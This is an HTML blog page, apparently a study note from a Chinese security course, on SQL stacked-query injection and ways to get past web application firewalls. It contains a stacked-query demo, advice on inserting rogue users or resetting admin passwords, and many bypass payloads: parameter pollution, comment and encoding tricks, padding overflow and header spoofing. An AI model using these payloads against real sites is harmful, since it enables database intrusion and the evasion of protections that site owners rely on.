@@ -1,0 +1,282 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Day18web漏洞-SQL注入之堆叠及waf绕过注入 | Fourth Street</title><meta name="keywords" content="小迪安全"><meta name="author" content="四号街1395"><meta name="copyright" content="四号街1395"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="堆叠查询注入stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆sql语句(多条)一起执行。而在真实的运用中也是这样的，我们知道在mysql 中，主要是命令行中，每一条语句结尾加;表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。 mysql&gt; select * from users; select * from ema">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Day18web漏洞-SQL注入之堆叠及waf绕过注入">
+<meta property="og:url" content="http://shj1395.top/2022/04/24/day18web-lou-dong-sql-zhu-ru-zhi-dui-die-ji-waf-rao-guo-zhu-ru/index.html">
+<meta property="og:site_name" content="Fourth Street">
+<meta property="og:description" content="堆叠查询注入stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆sql语句(多条)一起执行。而在真实的运用中也是这样的，我们知道在mysql 中，主要是命令行中，每一条语句结尾加;表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。 mysql&gt; select * from users; select * from ema">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://w.wallhaven.cc/full/pk/wallhaven-pkz8ke.jpg">
+<meta property="article:published_time" content="2022-04-23T23:22:38.000Z">
+<meta property="article:modified_time" content="2022-05-31T14:21:01.125Z">
+<meta property="article:author" content="四号街1395">
+<meta property="article:tag" content="小迪安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://w.wallhaven.cc/full/pk/wallhaven-pkz8ke.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://shj1395.top/2022/04/24/day18web-lou-dong-sql-zhu-ru-zhi-dui-die-ji-waf-rao-guo-zhu-ru/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Day18web漏洞-SQL注入之堆叠及waf绕过注入',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: true,
+  isToc: true,
+  postUpdate: '2022-05-31 22:21:01'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/xiugai.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 6.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/111.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://w.wallhaven.cc/full/pk/wallhaven-pkz8ke.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Fourth Street</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Day18web漏洞-SQL注入之堆叠及waf绕过注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-23T23:22:38.000Z" title="发表于 2022-04-24 07:22:38">2022-04-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-05-31T14:21:01.125Z" title="更新于 2022-05-31 22:21:01">2022-05-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B7%AF/">渗透之路</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Day18web漏洞-SQL注入之堆叠及waf绕过注入"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><img src="https://i0.hdslb.com/bfs/article/7282b07fd6d08a8d0e8c00b45f05057165a4e1f1.png"></p>
+<h1 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h1><p>stacked injections(堆叠注入)从名词的含义就可以看到应该是<strong>一堆sql语句(多条)一起执行</strong>。而在真实的运用中也是这样的，我们知道在mysql 中，主要是命令行中，每一条语句结尾加;表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。</p>
+<pre class=" language-mysql"><code class="language-mysql">mysql> select * from users; select * from emails;
++----+----------+------------+
+| id | username | password   |
++----+----------+------------+
+|  1 | Dumb     | Dumb       |
+|  2 | Angelina | I-kill-you |
+|  3 | Dummy    | p@ssword   |
+|  4 | secure   | crappy     |
+|  5 | stupid   | stupidity  |
+|  6 | superman | genious    |
+|  7 | batman   | mob!le     |
+|  8 | admin    | 123456     |
+|  9 | admin1   | admin1     |
+| 10 | admin2   | admin2     |
+| 11 | admin3   | admin3     |
+| 12 | dhakkan  | dumbo      |
+| 14 | admin4   | admin4     |
+| 15 | admin'#  | admin      |
++----+----------+------------+
+14 rows in set (0.00 sec)
+
++----+------------------------+
+| id | email_id               |
++----+------------------------+
+|  1 | Dumb@dhakkan.com       |
+|  2 | Angel@iloveu.com       |
+|  3 | Dummy@dhakkan.local    |
+|  4 | secure@dhakkan.local   |
+|  5 | stupid@dhakkan.local   |
+|  6 | superman@dhakkan.local |
+|  7 | batman@dhakkan.local   |
+|  8 | admin@dhakkan.com      |
++----+------------------------+
+8 rows in set (0.00 sec)
+
+</code></pre>
+<p>堆叠注入的可以运用于创建用户由于我们使用网站用户进行注入不能查看到数据库的密码但是我们可以创建用户来登录迂回的注入数据库，但是前提是网站的<strong>管理员必须是高权限才能完全创建用户</strong>。也可以使用update更新管理员用户密码。</p>
+<p>用法：</p>
+<p>​		注入需要管理员的账号密码，密码是加密的，无法解密</p>
+<p>​		堆叠注入在用户表中插入数据，用户密码自定义可以无需解				密实施登录 </p>
+<h1 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h1><p><img src="https://p.ananas.chaoxing.com/star3/origin/9e4f77a7a1960704249558ef74cb06e0.png"></p>
+<p>大体思路：针对不同的数据库的特性，绕过安全狗的检测，从而让注入的语句得到执行，绕过安全狗。</p>
+<p>常用的安全防护：阿里云盾、宝塔（较多的应用 于一些非法网站）、安全狗（最简单的，免费的应用也较多）</p>
+<p>知识点：</p>
+<ol>
+<li><p>​		特殊符号：有些语句，添加的某些特殊符号，并没有影响语句的执行效果。在waf绕过中，检测这些特殊符号干扰了检测机制，从而绕过检测。</p>
+<p>一些注释符号 ：/** */;%0A换行符；%23 为#号注释作用</p>
+</li>
+<li><p>编码和注释符混用</p>
+<p><code>?id=-1 union%23a%0Aselect 1,2,3%23</code> </p>
+<p>select a union将安全狗的屏蔽掉，但是多了a，需要用#a将a注释，然后换行，语句直接执行 union select 1,2,3#；emmmm这些操作好像不行了，安全狗还是拦截了。</p>
+</li>
+<li><p>参数污染</p>
+<p>当同时输入两个及以上的变量的时候 不同的服务器会选择不同的参数进行接收</p>
+<p>例子：<code>id=1/**&amp;id=-1%20union%20select%201,2,3%23*/</code> </p>
+<p>解释一下这个代码，由于apache和php这样的搭配，当存在两个变量的时候，会选取最后那个参数接收前面的有可能就直接丢弃了，而安全狗在进行匹配的时候猜想可能是匹配所有语句但是后面是注释符语句不会得到执行，安全狗就直接忽略了，所以最后数据库的执行语句应该是</p>
+<p><em><em>id=-1%20union%20select%201,2,3%23</em>/</em>*</p>
+</li>
+<li><p>fuzz大法（模糊/暴力测试）这是一种思路个人觉得类似于中转注入的方法</p>
+</li>
+</ol>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><h3 id="1-大小写-x2F-关键字替换"><a href="#1-大小写-x2F-关键字替换" class="headerlink" title="1.大小写/关键字替换"></a>1.大小写/关键字替换</h3><p>id=1 UnIoN/**/SeLeCT 1,user()</p>
+<p>Hex() bin() 等价于 ascii()</p>
+<p>Sleep() 等价于 benchmark()</p>
+<p>Mid()substring() 等价于 substr()</p>
+<p>@@user 等价于 User()</p>
+<p>@@Version 等价于 version()</p>
+<h3 id="2-各种编码"><a href="#2-各种编码" class="headerlink" title="2.各种编码"></a>2.各种编码</h3><p>大小写，URL，hex，%0A 等</p>
+<h3 id="3-注释使用"><a href="#3-注释使用" class="headerlink" title="3.注释使用"></a>3.注释使用</h3><p>//</p>
+<p> –</p>
+<p> –+</p>
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p> /**/</p>
+<p> :%00</p>
+<p> /!**/等</p>
+<h3 id="4-再次循环"><a href="#4-再次循环" class="headerlink" title="4.再次循环"></a>4.再次循环</h3><p>union==uunionnion</p>
+<h3 id="5-等价替换"><a href="#5-等价替换" class="headerlink" title="5.等价替换"></a>5.等价替换</h3><p>user()=@@user()</p>
+<p>and=&amp;</p>
+<p>or=|</p>
+<p>ascii=hex 等</p>
+<h3 id="6-参数污染"><a href="#6-参数污染" class="headerlink" title="6.参数污染"></a>6.参数污染</h3><p>?id=1&amp;id=2&amp;id=3</p>
+<h3 id="7-编码解码及加密解密"><a href="#7-编码解码及加密解密" class="headerlink" title="7.编码解码及加密解密"></a>7.编码解码及加密解密</h3><p>s-&gt;%73-&gt;%25%37%33</p>
+<p>hex,unlcode,base64 等</p>
+<h3 id="8-更改请求提交方式"><a href="#8-更改请求提交方式" class="headerlink" title="8.更改请求提交方式"></a>8.更改请求提交方式</h3><p>GET POST COOKIE 等</p>
+<p>POST-&gt;multipart/form-data</p>
+<h2 id="数据库特性"><a href="#数据库特性" class="headerlink" title="数据库特性"></a>数据库特性</h2><h3 id="1、Mysql-技巧"><a href="#1、Mysql-技巧" class="headerlink" title="1、Mysql 技巧"></a>1、Mysql 技巧</h3><p>（1）mysql 注释符有三种：#、/<em>…</em>/、– … (注意–后面有一个空格)</p>
+<p>（2）空格符:[0x09,0x0a-0x0d,0x20,0xa0]</p>
+<p>（3）特殊符号：%a 换行符</p>
+<p>可结合注释符使用%23%0a，%2d%2d%0a。</p>
+<p>（4）内联注释：</p>
+<p>/<em>!UnIon12345SelEcT</em>/ 1,user() //数字范围 1000-50540</p>
+<p>（5）mysql 黑魔法</p>
+<p>select{x username}from {x11 test.admin};</p>
+<h3 id="2、SQL-Server-技巧"><a href="#2、SQL-Server-技巧" class="headerlink" title="2、SQL Server 技巧"></a>2、SQL Server 技巧</h3><p>（1）用来注释掉注射后查询的其余部分：</p>
+<p>/* C 语言风格注释</p>
+<p>– SQL 注释</p>
+<p>; 00％ 空字节</p>
+<p>（2）空白符：[0x01-0x20]</p>
+<p>（3）特殊符号：%3a 冒号</p>
+<p>id=1 union:select 1,2 from:admin</p>
+<p>（4）函数变形：如 db_name<a href="">空白字符</a></p>
+<h3 id="3、Oracle-技巧"><a href="#3、Oracle-技巧" class="headerlink" title="3、Oracle 技巧"></a>3、Oracle 技巧</h3><p>（1）注释符：–、/**/</p>
+<p>（2）空白字符：[0x00,0x09，0x0a-0x0d,0x20]</p>
+<h3 id="4-配合-FUZZ"><a href="#4-配合-FUZZ" class="headerlink" title="4.配合 FUZZ"></a>4.配合 FUZZ</h3><p>select * from admin where id=1【位置一】union【位置二】select【位置三】1,2,db_name()【位置四】</p>
+<p>from【位置五】admin</p>
+<h2 id="逻辑层"><a href="#逻辑层" class="headerlink" title="逻辑层"></a>逻辑层</h2><h3 id="1、逻辑问题"><a href="#1、逻辑问题" class="headerlink" title="1、逻辑问题"></a>1、逻辑问题</h3><p>（1）云 waf 防护，一般我们会尝试通过查找站点的真实 IP，从而绕过 CDN 防护。</p>
+<p>（2）当提交GET、POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输入,可尝试Bypass。</p>
+<p>（3）HTTP 和 HTTPS 同时开放服务，没有做 HTTP 到 HTTPS 的强制跳转，导致 HTTPS 有 WAF 防护，HTTP没有防护，直接访问 HTTP 站点绕过防护。</p>
+<p>（4）特殊符号%00，部分 waf 遇到%00 截断，只能获取到前面的参数，无法获取到后面的有害参数输 入 ， 从 而 导 致 Bypass 。</p>
+<p>—id=1%00and 1=2 union select 1,2,column_name from information_schema.columns（试了下，不行）</p>
+<h3 id="2、性能问题"><a href="#2、性能问题" class="headerlink" title="2、性能问题"></a>2、性能问题</h3><p>猜想 1：在设计 WAF 系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。</p>
+<p>猜想 2：不少 WAF 是 C 语言写的，而 C 语言自身没有缓冲区保护机制，因此如果 WAF 在处理测试向量时超出了其缓冲区长度就会引发 bug，从而实现绕过。</p>
+<p>例子 1：</p>
+<p>?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,version(),database()</p>
+<p>PS：0xA*1000 指 0xA 后面”A”重复 1000 次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里 1000 只做参考也许在有些情况下可能不需要这么长也能溢出。 </p>
+<p>#例子 2：</p>
+<p>?a0=0&amp;a1=1&amp;…..&amp;a100=100&amp;id=1  union  select  1,schema_name,3  from</p>
+<p>INFORMATION_SCHEMA.schemata</p>
+<p>备注：获取请求参数，只获取前 100 个参数，第 101 个参数并没有获取到，导致 SQL 注入绕过。 </p>
+<h3 id="3、白名单"><a href="#3、白名单" class="headerlink" title="3、白名单"></a>3、白名单</h3><p>方式一：IP 白名单</p>
+<p>从网络层获取的 ip，这种一般伪造不来，如果是获取客户端的 IP，这样就可能存在伪造 IP 绕过的情况。</p>
+<p>测试方法：修改 http 的 header 来 bypass waf</p>
+<p>X-forwarded-for</p>
+<p>X-remote-IP</p>
+<p>X-originating-IP</p>
+<p>x-remote-addr</p>
+<p>X-Real-ip</p>
+<p>方式二：静态资源</p>
+<p>特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf .css 等等)，类似白名单机制，waf 为了检测效率，不去检测这样一些静态文件名后缀的请求。</p>
+<p><a target="_blank" rel="noopener" href="http://10.9.9.201/sql.php?id=1">http://10.9.9.201/sql.php?id=1</a></p>
+<p><a target="_blank" rel="noopener" href="http://10.9.9.201/sql.php/1.js?id=1">http://10.9.9.201/sql.php/1.js?id=1</a></p>
+<p>备注：Aspx/php 只识别到前面的.aspx/.php 后面基本不识别</p>
+<p>方式三：url 白名单</p>
+<p>为了防止误拦，部分 waf 内置默认的白名单列表，如 admin/manager/system 等管理后台。只要 url中存在白名单的字符串，就作为白名单不进行检测。常见的 url 构造姿势 </p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="shj1395.top">四号街1395</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://shj1395.top/2022/04/24/day18web-lou-dong-sql-zhu-ru-zhi-dui-die-ji-waf-rao-guo-zhu-ru/">http://shj1395.top/2022/04/24/day18web-lou-dong-sql-zhu-ru-zhi-dui-die-ji-waf-rao-guo-zhu-ru/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">转载请注明来处！！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/">小迪安全</a></div><div class="post_share"><div class="social-share" data-image="https://w.wallhaven.cc/full/pk/wallhaven-pkz8ke.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/04/24/day19web-lou-dong-sql-zhu-ru-zhi-sqlmap-rao-guo-waf/"><img class="prev-cover" src="https://p.ananas.chaoxing.com/star3/origin/f960207d9c1fdad812c8286f302a5f6a.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Day19web漏洞-SQL注入之SQLMAP绕过WAF</div></div></a></div><div class="next-post pull-right"><a href="/2022/04/23/day17web-lou-dong-sql-zhu-ru-zhi-er-ci-jia-jie-mi-dns-deng-zhu-ru/"><img class="next-cover" src="https://p.ananas.chaoxing.com/star3/origin/33f749d952ebf7cfc964fb60576c8e11.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Day17web漏洞-SQL注入之二次、加解密、DNS等注入</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/03/16/day12web-lou-dong-sql-zhu-ru-jian-yao/" title="Day12web漏洞-SQL注入简要"><img class="cover" src="https://p.ananas.chaoxing.com/star3/origin/2d9ffa847935e0bc1eb746e85300b8fb.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-16</div><div class="title">Day12web漏洞-SQL注入简要</div></div></a></div><div><a href="/2022/03/16/day11web-lou-dong-bi-dong-zhi-shi-dian/" title="Day11web漏洞-必懂知识点"><img class="cover" src="https://p.ananas.chaoxing.com/star3/origin/5990d04cd6367286ac29ed50066b08c6.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-16</div><div class="title">Day11web漏洞-必懂知识点</div></div></a></div><div><a href="/2022/04/16/day13web-lou-dong-sql-zhu-ru-zhi-mysql-zhu-ru/" title="Day13web漏洞-SQL注入之MySQL注入"><img class="cover" src="https://p.ananas.chaoxing.com/star3/origin/a7421262a6046a1acf0e94cc20030e1a.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-16</div><div class="title">Day13web漏洞-SQL注入之MySQL注入</div></div></a></div><div><a href="/2022/04/17/day14web-lou-dong-sql-zhu-ru-lei-xing-ji-ti-jiao-zhu-ru/" title="Day14web漏洞-SQL注入类型及提交注入"><img class="cover" src="https://p.ananas.chaoxing.com/star3/origin/53ebda2a33aee1877e0e84622abda09c.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-17</div><div class="title">Day14web漏洞-SQL注入类型及提交注入</div></div></a></div><div><a href="/2022/04/20/day15web-lou-dong-sql-zhu-ru-zhi-oracle-mongodb-deng-zhu-ru/" title="Day15web漏洞-SQL注入之Oracle、mongodb等注入"><img class="cover" src="https://p.ananas.chaoxing.com/star3/origin/f8f3ad61348547f33ae6478fb14b2550.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-20</div><div class="title">Day15web漏洞-SQL注入之Oracle、mongodb等注入</div></div></a></div><div><a href="/2022/04/22/day16web-lou-dong-sql-zhu-ru-zhi-cha-xun-fang-shi-ji-bao-cuo-mang-zhu/" title="Day16web漏洞-SQL注入之查询方式及报错盲注"><img class="cover" src="https://p.ananas.chaoxing.com/star3/origin/4623dee4d25a43ee2e64c3a190e0ef9a.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-22</div><div class="title">Day16web漏洞-SQL注入之查询方式及报错盲注</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/111.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">四号街1395</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xxxxx" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:xxxxxx@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">堆叠查询注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#waf%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">waf绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E5%B1%82"><span class="toc-number">3.1.</span> <span class="toc-text">应用层</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%A4%A7%E5%B0%8F%E5%86%99-x2F-%E5%85%B3%E9%94%AE%E5%AD%97%E6%9B%BF%E6%8D%A2"><span class="toc-number">3.1.1.</span> <span class="toc-text">1.大小写&#x2F;关键字替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%90%84%E7%A7%8D%E7%BC%96%E7%A0%81"><span class="toc-number">3.1.2.</span> <span class="toc-text">2.各种编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%B3%A8%E9%87%8A%E4%BD%BF%E7%94%A8"><span class="toc-number">3.1.3.</span> <span class="toc-text">3.注释使用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%86%8D%E6%AC%A1%E5%BE%AA%E7%8E%AF"><span class="toc-number">4.0.1.</span> <span class="toc-text">4.再次循环</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2"><span class="toc-number">4.0.2.</span> <span class="toc-text">5.等价替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="toc-number">4.0.3.</span> <span class="toc-text">6.参数污染</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 